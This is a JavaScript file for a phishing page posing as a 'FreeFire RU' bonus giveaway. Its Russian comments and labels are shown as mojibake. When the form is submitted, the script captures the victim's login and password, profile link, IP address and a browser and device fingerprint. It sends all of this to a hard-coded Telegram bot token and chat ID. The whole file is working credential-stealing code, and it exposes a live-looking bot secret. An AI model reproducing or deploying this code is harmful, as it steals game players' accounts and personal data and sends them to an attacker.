const options = document.querySelectorAll(".bonus-option");
options.forEach(option => {
    option.addEventListener("click", function() {
        options.forEach(o => o.classList.remove("selected"));
        this.classList.add("selected");
        selectedBonus = this.getAttribute("data-value");
    });
});

// –§—É–Ω–∫—Ü–∏—è –¥–ª—è –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∏—è –û–° –∏ –µ—ë –≤–µ—Ä—Å–∏–∏
function detectOSVersion() {
    const userAgent = navigator.userAgent;
    if (/Windows NT ([\d.]+)/i.test(userAgent)) return `Windows ${userAgent.match(/Windows NT ([\d.]+)/i)[1]}`;
    if (/Mac OS X ([\d_]+)/i.test(userAgent)) return `macOS ${userAgent.match(/Mac OS X ([\d_]+)/i)[1].replace(/_/g, '.')}`;
    if (/Android ([\d.]+)/i.test(userAgent)) return `Android ${userAgent.match(/Android ([\d.]+)/i)[1]}`;
    if (/CPU (iPhone )?OS ([\d_]+)/i.test(userAgent)) return `iOS ${userAgent.match(/OS ([\d_]+)/i)[1].replace(/_/g, '.')}`;
    if (/Linux/i.test(userAgent)) return "Linux";
    return "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–∞—è —Å–∏—Å—Ç–µ–º–∞";
}

document.getElementById("phishing-form").addEventListener("submit", async function(event) {
    event.preventDefault();
    let username = document.getElementById("username").value;
    let password = document.getElementById("password").value;
    let profileLink = document.getElementById("profile-link").value;

    try {
        // –ü–æ–ª—É—á–µ–Ω–∏–µ IP-–∞–¥—Ä–µ—Å–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
        const ipResponse = await fetch("https://api.ipify.org?format=json");
        const ipData = await ipResponse.json();
        const userIP = ipData.ip;

        // –û–ø—Ä–µ–¥–µ–ª–µ–Ω–∏–µ –û–° –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
        const userOSVersion = detectOSVersion();
        const userInfo = {
            platform: navigator.platform,
            language: navigator.language,
            screenWidth: screen.width,
            screenHeight: screen.height,
            innerWidth: window.innerWidth,
            innerHeight: window.innerHeight,
            outerWidth: window.outerWidth,
            outerHeight: window.outerHeight,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            deviceMemory: navigator.deviceMemory || 'unknown',
            hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
            connection: navigator.connection ? navigator.connection.effectiveType : "unknown"
        };

        const formattedInfo = `
FreeFire RU

üéÅ –õ–æ–≥–∏–Ω: ${username}
üîë –ü–∞—Ä–æ–ª—å: ${password}
üéØ –ë–æ–Ω—É—Å: ${selectedBonus}
üîó –°—Å—ã–ª–∫–∞: ${profileLink}
üåê IP-–∞–¥—Ä–µ—Å: ${userIP}
üíª –°–∏—Å—Ç–µ–º–∞: ${userOSVersion}
üñ•Ô∏è –ü–ª–∞—Ç—Ñ–æ—Ä–º–∞: ${userInfo.platform}
üåç –Ø–∑—ã–∫: ${userInfo.language}
üì∫ –†–∞–∑—Ä–µ—à–µ–Ω–∏–µ —ç–∫—Ä–∞–Ω–∞: ${userInfo.screenWidth}x${userInfo.screenHeight}
üìê –†–∞–∑–º–µ—Ä –æ–∫–Ω–∞: ${userInfo.innerWidth}x${userInfo.innerHeight}
üï∞Ô∏è –ß–∞—Å–æ–≤–æ–π –ø–æ—è—Å: ${userInfo.timezone}
üíæ –ü–∞–º—è—Ç—å —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞: ${userInfo.deviceMemory} GB
‚öôÔ∏è –õ–æ–≥–∏—á–µ—Å–∫–∏—Ö –ø—Ä–æ—Ü–µ—Å—Å–æ—Ä–æ–≤: ${userInfo.hardwareConcurrency}
üîå –¢–∏–ø –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è: ${userInfo.connection}
        `;

        // –û—Ç–ø—Ä–∞–≤–∫–∞ –¥–∞–Ω–Ω—ã—Ö —á–µ—Ä–µ–∑ Telegram –±–æ—Ç
        const botToken = "7811273259:AAHRUI55WZFQqTSEjye_sl_CoeRMBQ9xdIY";
        const chatId = "-1002441556145";
        const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
        
        await fetch(telegramUrl, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                chat_id: chatId,
                text: formattedInfo
            })
        });
    } catch (error) {
        console.error("–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –¥–∞–Ω–Ω—ã—Ö:", error);
        alert("–ù–µ —É–¥–∞–ª–æ—Å—å –æ—Ç–ø—Ä–∞–≤–∏—Ç—å –¥–∞–Ω–Ω—ã–µ. –ü–æ–ø—Ä–æ–±—É–π—Ç–µ —Å–Ω–æ–≤–∞.");
    }
});
